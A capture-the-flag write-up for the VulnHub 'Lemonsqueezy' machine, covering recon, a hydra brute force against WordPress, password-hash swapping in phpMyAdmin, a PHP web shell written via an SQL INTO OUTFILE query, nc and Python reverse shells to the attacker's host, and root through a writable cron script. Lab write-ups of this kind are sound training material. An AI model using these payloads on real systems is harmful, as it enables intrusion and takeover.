---
title: "Lemonsqueezy"
date: 2024-07-05
draft: false
summary: "Writeup for Lemonsqueezy CTF challenge on VulnHub."
tags: ["linux", "wordpress", "sql", "cron"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/lemonsqueezy/cover.webp"
  caption: "Lemonsqueezy VulnHub Challenge"
  alt: "Lemonsqueezy cover"
platform: "VulnHub"
---

LemonSqueezy is a beginner boot2root challenge. The goal of this challenge is to capture 2 flags by hacking into the system.
<!--more-->
To download **lemonsqueezy** click on the link given below
- https://www.vulnhub.com/entry/lemonsqueezy-1,473/

## Recon

I performed an **nmap** aggressive scan on the target to find information about open ports and running services.

```shell
nmap -p- -A TARGET --min-rate 10000 -oN lemon.nmap
```

| **Port** | **Service** |
| -------- | ----------- |
| 80       | http        |

![](https://cdn.ziomsec.com/lemonsqueezy/1.webp)

## Initial Access

Since the target was running a web server, I accessed it using a browser and found *Apache*'s landing page.

![](https://cdn.ziomsec.com/lemonsqueezy/2.webp)

The web page did not reveal anything special - so I performed a fuzz scan using **dirb** to find hidden files and directories.

```shell
dirb http://TARGET
```

![](https://cdn.ziomsec.com/lemonsqueezy/3.webp)
![](https://cdn.ziomsec.com/lemonsqueezy/4.webp)

**dirb** identified some interesting files and directories. I accessed the *wordpress* directory and found a wordpress website. Upon scrolling to the bottom, I found a link that took me to the login page.

![](https://cdn.ziomsec.com/lemonsqueezy/5.webp)

![](https://cdn.ziomsec.com/lemonsqueezy/6.webp)

To find valid users, I used **wpscan**.

```shell
wpscan --url http://TARGET/wordpress -e at,ap,u
```

![](https://cdn.ziomsec.com/lemonsqueezy/7.webp)

![](https://cdn.ziomsec.com/lemonsqueezy/8.webp)

I then used **hydra** to find the password of *orange*.

```shell
hydra -l 'orage' -P /usr/share/wordlists/rockyou.txt TARGET http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:password'
```

![](https://cdn.ziomsec.com/lemonsqueezy/9.webp)

I then logged into the **wordpress** site using these credentials.

![](https://cdn.ziomsec.com/lemonsqueezy/10.webp)

Further reconnaissance revealed something interesting in the *Posts* tab.

![](https://cdn.ziomsec.com/lemonsqueezy/11.webp)

I used this as a password in the *phpmyadmin* page that I had discovered earlier and logged in successfully.

![](https://cdn.ziomsec.com/lemonsqueezy/12.webp)

![](https://cdn.ziomsec.com/lemonsqueezy/13.webp)

The *wordpress* database had a table called *wp_users* which contained hashes password of both the users that I had discovered earlier.

![](https://cdn.ziomsec.com/lemonsqueezy/14.webp)

I then replaced the hash of *lemon* with *orange* so that I could access that user's wordpress panel.

![](https://cdn.ziomsec.com/lemonsqueezy/15.webp)

I then logged in as *lemon* and found some more tabs.

![](https://cdn.ziomsec.com/lemonsqueezy/16.webp)

I tried uploading a **php-reverse-shell** in the `Appearance -> Editor -> 404 template` but did not have enough permissions. So, I went back to *phpmyadmin* and found a table that allowed me to execute SQL queries.

![](https://cdn.ziomsec.com/lemonsqueezy/17.webp)

I created a **php** backdoor using SQL by executing the following query

```text
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/wordpress/shell.php"
```
> This would allow me to execute commands using the `cmd` parameter.

![](https://cdn.ziomsec.com/lemonsqueezy/18.webp)

I then validate if I could use it to execute commands:

```
http://TARGET/wordpress/shell.php?cmd=whoami
```

![](https://cdn.ziomsec.com/lemonsqueezy/19.webp)

Since it worked, I attempted to get a reverse shell out of it.
- I visited **revshell.com** and copied an **nc** reverse shell payload.
- I started a **netcat** listener and pasted the payload into the browser.

```
http://TARGET/wordpress/shell.php?cmd=nc KALI 8080 -e /bin/bash
```

![](https://cdn.ziomsec.com/lemonsqueezy/20.webp)

```shell
nc -lnvp 80
```

![](https://cdn.ziomsec.com/lemonsqueezy/21.webp)

I then spawned a pty shell using **python**:

```shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://cdn.ziomsec.com/lemonsqueezy/22.webp)

Finally, I captured the user flag from the */var/www/* directory.

![](https://cdn.ziomsec.com/lemonsqueezy/23.webp)

## Privilege Escalation

### Enumerating Privesc Vector

To perform further enumeration, I downloaded the **linux-smart-enumeration** script on the target system.

![](https://cdn.ziomsec.com/lemonsqueezy/24.webp)

After giving execution permission, I executed the script:

```shell
chmod +x lse.sh
./lse.sh
```

![](https://cdn.ziomsec.com/lemonsqueezy/25.webp)

The script identified an interesting file that was executed by the crontab as root and had modification permissions for all users.

![](https://cdn.ziomsec.com/lemonsqueezy/26.webp)

![](https://cdn.ziomsec.com/lemonsqueezy/27.webp)

The next thing I did was navigate to the folder and view the file.

![](https://cdn.ziomsec.com/lemonsqueezy/28.webp)

### Exploiting Misconfigured Cron

I then added the following **python** reverse shell payload to the file and started a netcat listener.

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

![](https://cdn.ziomsec.com/lemonsqueezy/29.webp)

After some time, I got a reverse shell on my listener.

![](https://cdn.ziomsec.com/lemonsqueezy/30.webp)

After getting root access, I captured the final flag from the *root* directory.

```shell
cd /root
cat root.txt
```

![](https://cdn.ziomsec.com/lemonsqueezy/31.webp)

## Closure

Here's a brief summary of how I compromised **lemonsqueezy** and captured both flags:
- I discovered 2 login panels, */wordpress/wp-login.php* and */phpmyadmin*, by fuzzing directories of the web server.
- Using **wpscan**, I identified available users.
- I found the password for *orange* and logged into the WordPress site using those credentials.
- I obtained the password for *orange*'s *phpmyadmin* page.
- Using this, I logged into *phpmyadmin* and created a backdoor using an **SQL** query.
- I leveraged the backdoor to establish a foothold and captured the user flag by navigating up a few directories.
- I discovered a file executed as root through **cron jobs** with modification permissions.
- I uploaded my own **Python** reverse shell code into it and obtained a reverse shell as **root**
- Finally, I captured the second flag from the */root* directory.

That concludes my writeup. Until next time!

---
